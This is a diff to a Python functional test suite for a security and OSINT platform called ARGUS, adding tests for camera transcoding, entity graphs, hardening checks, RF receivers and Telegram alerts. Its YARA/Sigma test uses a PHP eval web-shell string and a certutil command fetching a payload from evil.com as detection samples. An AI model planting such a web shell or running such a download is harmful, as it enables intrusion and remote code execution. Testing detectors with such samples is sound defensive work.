@@ -20,7 +20,7 @@ def record(test_name, passed, details=""):
     print(f"{status} | {test_name}: {details}")
 
 print("================================================================")
-print("🛡️ ARGUS v2.2.0 // AUTOMATED FUNCTIONAL VERIFICATION SUITE")
+print("🛡️ ARGUS v2.7.0 // AUTOMATED FUNCTIONAL VERIFICATION SUITE")
 print("================================================================")
 
 # 1. Health & Service Metadata
@@ -926,6 +926,154 @@ try:
     record("51. Camera HLS Live Video Streaming API", passed, f"MOW Stream: {cam_stream_data.get('protocol')} (HLS={cam_stream_data.get('hls_available')}) | LED Stream: {cam_stream2_data.get('protocol')}")
 except Exception as e:
     record("51. Camera HLS Live Video Streaming API", False, str(e))
+
+# 52. RTSP Micro-Transcoder Daemon & Status API
+try:
+    tc_status_res = client.get("/api/cameras/transcode/status/CAM_RU_MOW_01")
+    tc_data = tc_status_res.json()
+    
+    passed = (
+        tc_status_res.status_code == 200
+        and tc_data.get("success") is True
+        and "status" in tc_data
+        and "ffmpeg_installed" in tc_data
+        and tc_data.get("camera_id") == "CAM_RU_MOW_01"
+    )
+    record("52. RTSP Micro-Transcoder Daemon", passed, f"Transcoder Status: {tc_data.get('status')} | FFmpeg Installed: {tc_data.get('ffmpeg_installed')}")
+except Exception as e:
+    record("52. RTSP Micro-Transcoder Daemon", False, str(e))
+
+# 53. OSINT Interactive 2D Synapse Entity Graph Engine
+try:
+    graph_res = client.post("/api/osint/graph/build", json={"target": "operator_shadow", "target_type": "username"})
+    graph_data = graph_res.json()
+    
+    nodes = graph_data.get("nodes", [])
+    links = graph_data.get("links", [])
+    has_target_node = any(n.get("id") == "target" and n.get("type") == "target" for n in nodes)
+    has_cat_node = any(n.get("type") == "category" for n in nodes)
+    
+    passed = (
+        graph_res.status_code == 200
+        and graph_data.get("success") is True
+        and graph_data.get("target") == "operator_shadow"
+        and len(nodes) >= 5
+        and len(links) >= 4
+        and has_target_node
+        and has_cat_node
+    )
+    record("53. OSINT Synapse Entity Graph Engine", passed, f"Generated {len(nodes)} nodes, {len(links)} links across {graph_data.get('clusters_count')} clusters")
+except Exception as e:
+    record("53. OSINT Synapse Entity Graph Engine", False, str(e))
+
+# 54. Forensics Threat Detection: YARA & Sigma Engine
+try:
+    # 1. Catalog
+    cat_res = client.get("/api/forensics/rules/catalog")
+    cat_data = cat_res.json()
+    
+    # 2. Scan WebShell payload (YARA)
+    webshell_payload = "<?php @eval(base64_decode($_POST['cmd'])); ?>"
+    yara_res = client.post("/api/forensics/rules/scan", json={"content": webshell_payload, "target_name": "webshell.php"})
+    yara_data = yara_res.json()
+    
+    # 3. Scan LOLBin execution (Sigma)
+    lolbin_payload = "cmd.exe /c certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\p.exe"
+    sigma_res = client.post("/api/forensics/rules/scan", json={"content": lolbin_payload, "target_name": "audit.log"})
+    sigma_data = sigma_res.json()
+    
+    passed = (
+        cat_res.status_code == 200
+        and cat_data.get("total_signatures", 0) >= 10
+        and yara_res.status_code == 200
+        and yara_data.get("matched_rules_count", 0) >= 1
+        and yara_data.get("max_severity") == "CRITICAL"
+        and sigma_res.status_code == 200
+        and sigma_data.get("matched_rules_count", 0) >= 1
+        and sigma_data.get("max_severity") in ("HIGH", "CRITICAL")
+    )
+    yara_match_name = yara_data.get("matches", [{}])[0].get("id", "Unknown")
+    sigma_match_name = sigma_data.get("matches", [{}])[0].get("id", "Unknown")
+    record("54. YARA & Sigma Threat Engine", passed, f"Loaded {cat_data.get('total_signatures')} rules | WebShell Detected: {yara_match_name} | LOLBin Detected: {sigma_match_name}")
+except Exception as e:
+    record("54. YARA & Sigma Threat Engine", False, str(e))
+
+# 55. Cross-Platform Host Hardening Matrix (Multi-OS Controls)
+try:
+    hard_res = client.get("/api/system/hardening")
+    hard_data = hard_res.json()
+    checks = hard_data.get("checks", [])
+    
+    passed = (
+        hard_res.status_code == 200
+        and hard_data.get("success") is True
+        and "os" in hard_data
+        and len(checks) >= 3
+        and hard_data.get("hardening_score") is not None
+        and all("id" in c and "status" in c and "remediation" in c for c in checks)
+    )
+    record("55. Cross-Platform Host Hardening Matrix", passed, f"Host OS: {hard_data.get('os')} | Score: {hard_data.get('hardening_score')}% | Verified {len(checks)} system controls")
+except Exception as e:
+    record("55. Cross-Platform Host Hardening Matrix", False, str(e))
+
+# 56. RF Spectrum & Global WebSDR Engine
+try:
+    freq_res = client.get("/api/network/rf/frequencies")
+    freq_data = freq_res.json()
+    
+    rec_res = client.get("/api/network/rf/receivers")
+    rec_data = rec_res.json()
+    
+    waterfall_res = client.get("/api/network/rf/waterfall?center_mhz=121.5&bandwidth_mhz=2.0")
+    wf_data = waterfall_res.json()
+    
+    has_air_guard = any("121.5" in f.get("frequency", "") for f in freq_data.get("frequencies", []))
+    has_marine_ch16 = any("156.8" in f.get("frequency", "") for f in freq_data.get("frequencies", []))
+    
+    passed = (
+        freq_res.status_code == 200
+        and freq_data.get("total_frequencies", 0) >= 6
+        and has_air_guard
+        and has_marine_ch16
+        and rec_res.status_code == 200
+        and rec_data.get("total_receivers", 0) >= 4
+        and waterfall_res.status_code == 200
+        and wf_data.get("bins_count", 0) == 128
+    )
+    record("56. RF Spectrum & Global WebSDR Engine", passed, f"Frequencies: {freq_data.get('total_frequencies')} | Receivers: {rec_data.get('total_receivers')} | Waterfall FFT Bins: {wf_data.get('bins_count')}")
+except Exception as e:
+    record("56. RF Spectrum & Global WebSDR Engine", False, str(e))
+
+# 57. Watcher Daemon Telegram Push Alerts & Air-Gap Guard
+try:
+    # 1. Check schema
+    tg_cfg_res = client.get("/api/watcher/telegram/config")
+    tg_cfg_data = tg_cfg_res.json()
+    
+    # 2. Update config
+    set_cfg_res = client.post("/api/watcher/telegram/config", json={"enabled": True, "chat_id": "99887766"})
+    set_cfg_data = set_cfg_res.json()
+    
+    # 3. Air-Gap test blocking
+    client.post("/api/system/airgap/toggle", json={"enabled": True})
+    test_drill_res = client.post("/api/watcher/telegram/test")
+    test_drill_data = test_drill_res.json()
+    
+    # Restore Air-Gap state
+    client.post("/api/system/airgap/toggle", json={"enabled": False})
+    
+    passed = (
+        tg_cfg_res.status_code == 200
+        and tg_cfg_data.get("success") is True
+        and set_cfg_res.status_code == 200
+        and set_cfg_data.get("chat_id") == "99887766"
+        and test_drill_res.status_code == 200
+        and test_drill_data.get("air_gap_enforced") is True
+        and test_drill_data.get("success") is False
+    )
+    record("57. Watcher Telegram Alerts & Air-Gap Guard", passed, f"Config: Verified (ChatID: {set_cfg_data.get('chat_id')}) | Air-Gap Egress Blocked: {test_drill_data.get('air_gap_enforced')}")
+except Exception as e:
+    record("57. Watcher Telegram Alerts & Air-Gap Guard", False, str(e))
 
 print("================================================================")
 total_passed = sum(1 for r in results if r["passed"])
